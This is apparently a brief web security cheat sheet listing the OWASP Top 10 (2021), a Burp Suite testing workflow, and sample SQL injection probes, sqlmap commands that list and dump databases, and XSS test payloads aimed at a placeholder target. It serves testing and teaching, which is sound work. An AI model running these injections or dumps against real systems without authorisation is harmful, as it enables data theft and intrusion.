# Web Application Security

## OWASP Top 10 (2021)

1. **Broken Access Control** — Users accessing unauthorized data
2. **Cryptographic Failures** — Weak encryption, HTTP instead of HTTPS
3. **Injection** — SQL, Command, XSS
4. **Insecure Design** — Security not considered in design phase
5. **Security Misconfiguration** — Default passwords, open ports
6. **Vulnerable Components** — Outdated libraries
7. **Authentication Failures** — Weak passwords, no MFA
8. **Software & Data Integrity Failures** — Unverified updates
9. **Security Logging Failures** — No audit trails
10. **SSRF** — Server-Side Request Forgery

## Testing with Burp Suite

```
1. Open Burp Suite
2. Configure browser proxy: 127.0.0.1:8080
3. Browse target application
4. Intercept and modify requests in Proxy tab
5. Send to Repeater for manual testing
6. Use Scanner for automated checks
```

## SQL Injection Testing

```bash
# Manual testing
curl "http://target.com/page?id=1'"
curl "http://target.com/page?id=1 OR 1=1--"

# Automated
sqlmap -u "http://target.com/page?id=1" --level=3
sqlmap -u "http://target.com/page?id=1" --dbs      # List databases
sqlmap -u "http://target.com/page?id=1" --dump      # Dump data
```

## XSS Testing

```html
<!-- Test payloads -->
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
```
